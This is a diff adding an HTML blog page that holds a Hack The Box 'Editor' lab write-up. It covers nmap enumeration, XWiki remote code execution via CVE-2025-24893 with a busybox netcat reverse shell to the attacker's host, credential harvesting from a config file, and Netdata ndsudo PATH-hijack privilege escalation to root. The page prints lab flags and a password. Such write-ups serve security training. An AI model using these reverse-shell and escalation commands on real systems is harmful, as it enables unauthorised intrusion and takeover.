@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.148.104 -Pn Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 13:16 CEST Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.50% done; ETC: 13:20 (0:03:54 remaining) Stats: 0:17:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 82.87% done; ETC: 13:38 (0:03:43 remaining) Nmap scan report for 10.129.148.104 Host is up (0.099s latency). Not shown: 907 closed tcp ports (reset), 90 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 1591.10 seconds Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-editor/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.148.104 -Pn Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 13:16 CEST Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.50% done; ETC: 13:20 (0:03:54 remaining) Stats: 0:17:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 82.87% done; ETC: 13:38 (0:03:43 remaining) Nmap scan report for 10.129.148.104 Host is up (0.099s latency). Not shown: 907 closed tcp ports (reset), 90 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 1591.10 seconds Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+  <meta itemprop="wordCount" content="1176">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.148.104 -Pn Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 13:16 CEST Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.50% done; ETC: 13:20 (0:03:54 remaining) Stats: 0:17:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 82.87% done; ETC: 13:38 (0:03:43 remaining) Nmap scan report for 10.129.148.104 Host is up (0.099s latency). Not shown: 907 closed tcp ports (reset), 90 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 1591.10 seconds Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-editor/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>nmap 10.129.148.104 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 13:16 CEST
+Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 2.50% done; ETC: 13:20 (0:03:54 remaining)
+Stats: 0:17:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 82.87% done; ETC: 13:38 (0:03:43 remaining)
+Nmap scan report for 10.129.148.104
+Host is up (0.099s latency).
+Not shown: 907 closed tcp ports (reset), 90 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 1591.10 seconds
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+<pre tabindex="0"><code>nmap -p22,80,8080 -sCV 10.129.148.104 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 13:50 CEST
+Nmap scan report for editor.htb (10.129.148.104)
+Host is up (0.095s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Editor - SimplistCode Pro
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8080/tcp open  http    Jetty 10.0.20
+|_http-server-header: Jetty(10.0.20)
+| http-title: XWiki - Main - Intro
+|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
+| http-robots.txt: 50 disallowed entries (15 shown)
+| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
+| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
+| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
+| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
+| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
+|_/xwiki/bin/undelete/
+| http-cookie-flags: 
+|   /: 
+|     JSESSIONID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: PROPFIND LOCK UNLOCK
+| http-webdav-scan: 
+|   WebDAV type: Unknown
+|   Server Type: Jetty(10.0.20)
+|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
+|_http-open-proxy: Proxy might be redirecting requests
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>As you can see, there are two HTTP ports open that I can take a look at. First, I looked at the port 80 connection. This takes you to the following page.</p>
+<p>![[Pasted image 20250811141349.png]]
+But we won&rsquo;t be able to do anything on this page. In the nmap command, you can see that port 8080 is also open. If we go to this web page, you will see the following.</p>
+<p>![[Pasted image 20250811141813.png]]</p>
+<p>There, I followed the steps to download the .deb file and open it using simplistcode, but you will encounter the following error message. <a href="http://editor.htb:8080/xwiki/bin/view/Main/Installation/">http://editor.htb:8080/xwiki/bin/view/Main/Installation/</a></p>
+<p>![[Pasted image 20250811141944.png]]
+So I took another look at my nmap command and saw that it contained a bunch of different URLs. I started searching for a specific URL that might contain more information, and my search led me to the following URL: <a href="http://editor.htb:8080/xwiki/bin/save">http://editor.htb:8080/xwiki/bin/save</a>, which redirects you to the login page that can be found at the following URL. <a href="http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin?srid=M4QBa4rn&amp;xredirect=%2Fxwiki%2Fbin%2Fsave%3Fsrid%3DM4QBa4rn">http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin?srid=M4QBa4rn&amp;xredirect=%2Fxwiki%2Fbin%2Fsave%3Fsrid%3DM4QBa4rn</a> On the login page, you can see that it is running on xwiki Debian version 15.10.8. So we will search the internet for an exploit for this version.</p>
+<p>To find the exploit, I searched for the following term: ‘XWiki Debian 15.10.8 exploit github’, which will take you to the following link. <a href="https://github.com/gunzf0x/CVE-2025-24893">https://github.com/gunzf0x/CVE-2025-24893</a></p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Editor/CVE-2025-24893]
+└─$ python3 CVE-2024-24893.py -t &#39;http://editor.htb:8080&#39; -c &#39;busybox nc 10.10.14.51 9001 -e /bin/bash&#39;
+[*] Attacking http://editor.htb:8080
+[*] Injecting the payload:
+http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.51%209001%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D                                                                                                                 
+[*] Command executed
+
+~Happy Hacking
+
+┌──(kali㉿kali)-[~/HTB/Editor]
+└─$ nc -lvnp 9001              
+listening on [any] 9001 ...
+connect to [10.10.14.51] from (UNKNOWN) [10.129.148.104] 52500
+python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><p>I searched the connection for usernames and passwords. I found the username “Oliver” and the following password “theEd1t0rTeam99.” You can find this by executing the following.</p>
+<pre tabindex="0"><code>xwiki@editor:/etc/xwiki$ grep -ri &#34;password&#34;
+grep -ri &#34;password&#34;
+hibernate.cfg.xml:    &lt;property name=&#34;hibernate.connection.password&#34;&gt;theEd1t0rTeam99&lt;/property&gt;
+
+xwiki@editor:/etc/xwiki$ ls /home
+ls /home
+oliver
+</code></pre><p>You can use this information to log in to the SSH server.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Editor/CVE-2025-24893]
+└─$ ssh oliver@10.129.148.104
+oliver@10.129.148.104&#39;s password: 
+Permission denied, please try again.
+oliver@10.129.148.104&#39;s password: theEd1t0rTeam99
+
+oliver@editor:~$
+</code></pre><p>There you can find the user flag.</p>
+<p>User flag: dd0e6034603744dac7c8fa3461b63e5a</p>
+<pre tabindex="0"><code>oliver@editor:~$ cat user.txt 
+dd0e6034603744dac7c8fa3461b63e5a
+</code></pre><p>Now I have started downloading linpeas on the machine to see if there is any sensitive data, paths, or possible exploits that could be misused. There we can see that there is a localhost with port 19999 (Netdata port) in the hosts file. We will now set this up using port forwarding.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB]
+└─$ ssh oliver@editor.htb -L 19999:127.0.0.1:19999                              
+oliver@editor.htb&#39;s password: theEd1t0rTeam99
+</code></pre><p>If we now navigate to the webpage, you will see the following.</p>
+<p>![[Pasted image 20250812200019.png]]</p>
+<p>As you can see in the top right corner, there is an exclamation mark. This means that there is a critical alarm. When we take a closer look, we see that the netdata agent is not up to date. It is currently running version 1.45.2, so we will search for an exploit using the following term: <code>exploit netdata 1.45.2 github</code>. If you use this search term, you will see the following link. <a href="https://github.com/AliElKhatteb/CVE-2024-32019-POC.git">https://github.com/AliElKhatteb/CVE-2024-32019-POC.git</a></p>
+<p>So I executed what was in the exploit and uploaded it to my ssh connection. Before you convert your exploit.c file to the nvme file, you will need to change your IP address in the script to your own IP address. Then you can upload the nvme file to the ssh connection with Oliver. There you will have to give the file executable rights so that you can execute it, and then you start the listener on your own machine and execute it as follows.</p>
+<pre tabindex="0"><code>Op de ssh connectie
+
+oliver@editor:~$ wget http://10.10.14.144:8000/nvme
+--2025-08-12 18:13:03--  http://10.10.14.144:8000/nvme
+Connecting to 10.10.14.144:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 758864 (741K) [application/octet-stream]
+Saving to: ‘nvme’
+
+nvme                         100%[==============================================&gt;] 741.08K  1.12MB/s    in 0.6s    
+
+2025-08-12 18:13:04 (1.12 MB/s) - ‘nvme’ saved [758864/758864]
+
+oliver@editor:~$ ls
+linpeas_linux_amd64  nvme  user.txt
+oliver@editor:~$ chmod +x nvme
+oliver@editor:~$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+
+Listener op je eigen machine
+
+┌──(kali㉿kali)-[~/HTB/Editor/CVE-2024-32019-POC]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.144] from (UNKNOWN) [10.129.222.76] 50664
+root@editor:/home/oliver#
+</code></pre><h3 id="what-exactly-did-i-do-within-the-ssh-connection">What exactly did I do within the ssh connection?</h3>
+<p>I have assigned executable rights to the nvme file so that we can execute it. By using the <code>PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</code> command, I temporarily place my current directory (<code>$(pwd)</code>) at the front of my <code>PATH</code> variable. This ensures that programs in my current directory are found first when I execute a command, while still allowing me to access all standard commands in my existing <code>PATH</code>. Next, I start the <code>ndsudo</code> program, which is located in the Netdata plugin directory (<code>/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</code>). With the appropriate permissions, this Netdata utility can execute commands that normal users are not allowed to execute, but which are necessary for system monitoring. As an argument, I pass <code>nvme-list</code>, which instructs <code>ndsudo</code> to display an overview of my NVMe disks and their status.</p>
+<p>In short: I temporarily modify my search path, start the Netdata plugin <code>ndsudo</code>, and have it execute the command <code>nvme-list</code> so that I can obtain a connection to the root user via my listener.</p>
+<p>As you can see, we have a connection to the root user and can therefore also obtain the root flag.
+Root flag: 112d3f29c2eebf1729083b72f78a56ee</p>
+<pre tabindex="0"><code>root@editor:/root# cat root.txt
+cat root.txt
+112d3f29c2eebf1729083b72f78a56ee
+</code></pre><p>ROOTED</p>
+<p>![[Pasted image 20250812202031.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
